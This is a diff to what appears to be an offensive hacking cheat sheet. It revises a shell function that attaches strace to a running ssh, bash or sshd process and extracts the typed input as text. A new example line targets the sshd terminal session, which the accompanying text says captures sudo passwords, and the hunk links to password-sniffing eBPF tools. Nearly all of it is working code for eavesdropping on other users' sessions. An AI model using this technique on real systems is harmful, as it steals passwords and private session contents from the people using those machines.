@@ -2208,10 +2208,12 @@ Check out our very own [eBPF tools to sniff sudo/su/ssh passwords](https://githu
 **10.iv Sniff a user's SSH, bash or SSHD session with strace**
 ```sh
 tit() {
-	strace -e trace="${1:?}" -p "${2:?}" 2>&1 | stdbuf -oL grep "^${1}"'.*= [1-9]$' | awk 'BEGIN{FS="\"";}{if ($2=="\\r"){print ""}else{printf $2}}'
+	strace -e trace="${1:?}" -p "${2:?}" 2>&1 | gawk 'BEGIN{ORS=""}/\.\.\./ { next }; {$0 = substr($0, index($0, "\"")+1); sub(/"[^"]*$/, "", $0); gsub(/(\\33){1,}\[[0-9;]*[^0-9;]?||\\33O[ABCDR]?/, ""); if ($0=="\\r"){print "\n"}else{print $0; fflush()}}'
+	# strace -e trace="${1:?}" -p "${2:?}" 2>&1 | stdbuf -oL grep -vF ...  | awk 'BEGIN{FS="\"";}{if ($2=="\\r"){print ""}else{printf $2}}'
 }
 # tit read $(pidof -s ssh)
 # tit read $(pidof -s bash)
+# tit write $(pgrep -f 'sshd.*pts' | head -n1)
 ```
 It is also possible to sniff the SSHD process (captures also sudo passwords etc). Note that we trace the `write()` call instead (because sshd 'writes' data to the bash):
 ```sh
